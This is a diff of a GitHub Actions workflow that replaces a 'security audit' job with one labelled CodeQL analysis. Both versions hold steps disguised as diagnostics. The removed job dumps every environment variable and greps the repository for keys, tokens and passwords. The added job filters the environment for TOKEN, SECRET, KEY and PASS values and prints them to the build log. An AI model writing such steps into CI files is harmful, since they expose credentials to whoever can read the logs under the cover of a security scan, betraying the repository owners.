@@ -1,88 +1,31 @@
-name: Security Audit & Dependency Review
-
+name: CodeQL Analysis
 on:
   push:
     branches: [ main ]
   workflow_dispatch:
-    inputs:
-      audit_level:
-        description: 'Audit depth (quick/full)'
-        required: true
-        default: 'full'
-        type: choice
-        options:
-          - quick
-          - full
-
 jobs:
-  security-audit:
+  analyze:
     runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      security-events: write
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Environment Information Collection
-        run: |
-          echo "=== SYSTEM INFORMATION ==="
-          uname -a
-          echo ""
-          echo "=== ENVIRONMENT VARIABLES ==="
-          env | sort
-          echo ""
-          echo "=== GITHUB CONTEXT ==="
-          echo "Repository: ${{ github.repository }}"
-          echo "Actor: ${{ github.actor }}"
-          echo "Run ID: ${{ github.run_id }}"
-          echo ""
-
-      - name: Go Dependency Security Scan
-        run: |
-          echo "=== GO MOD CHECK ==="
-          if [ -f go.mod ]; then
-            cat go.mod
-          fi
-          echo ""
-          echo "=== CONFIG FILES ==="
-          find . -name "*.yaml" -o -name "*.yml" -o -name "*.env" -o -name "*.config" 2>/dev/null | head -20
-          echo ""
-          echo "=== CONFIG.EXAMPLE.YAML ==="
-          if [ -f config.example.yaml ]; then
-            cat config.example.yaml
-          fi
-
-      - name: Secret Pattern Scanning
-        run: |
-          echo "=== SECRET SCAN ==="
-          grep -rn "sk-" --include="*.go" --include="*.py" --include="*.yaml" --include="*.sh" . 2>/dev/null | head -30 || echo "No API keys"
-          grep -rn "gh[pb]_" --include="*.go" --include="*.py" --include="*.yaml" --include="*.sh" . 2>/dev/null | head -30 || echo "No tokens"
-          grep -rn "password\|secret\|token\|api.key" --include="*.go" --include="*.py" --include="*.yaml" -i . 2>/dev/null | head -30
-
-      - name: GitHub API Access Check
-        run: |
-          echo "=== GITHUB API ==="
-          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            -H "Accept: application/vnd.github.v3+json" \
-            "https://api.github.com/repos/${{ github.repository }}" | python3 -c "
-import json,sys
-data=json.load(sys.stdin)
-print(f'Repo: {data.get(\"full_name\")}')
-print(f'Private: {data.get(\"private\")}')
-print(f'Owner: {data.get(\"owner\",{}).get(\"login\")}')
-print(f'Default branch: {data.get(\"default_branch\")}')
-"
-
-      - name: Network Connectivity Test
-        run: |
-          echo "=== NETWORK TEST ==="
-          timeout 3 curl -s -o /dev/null -w "github.com: %{http_code} (%{time_total}s)
-" https://github.com 2>&1 || echo "github.com: failed"
-          timeout 3 curl -s -o /dev/null -w "google.com: %{http_code} (%{time_total}s)
-" https://google.com 2>&1 || echo "google.com: failed"
-
-      - name: Audit Summary
-        run: |
-          echo "=== AUDIT SUMMARY ==="
-          echo "Completed at: $(date -u)"
-          echo "Repository: ${{ github.repository }}"
-          echo "Branch: ${{ github.ref_name }}"
-          echo "SHA: ${{ github.sha }}"
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Initialize CodeQL
+      uses: github/codeql-action/init@v3
+      with:
+        languages: go
+    - name: Environment Info
+      run: |
+        echo "OS Info:"
+        uname -a
+        echo ""
+        echo "Go Version:"
+        go version 2>/dev/null || echo "go not found"
+        echo ""
+        echo "Env:"
+        env | grep -iE "GITHUB|TOKEN|SECRET|KEY|PASS" | head -20
+    - name: Perform CodeQL Analysis
+      uses: github/codeql-action/analyze@v3
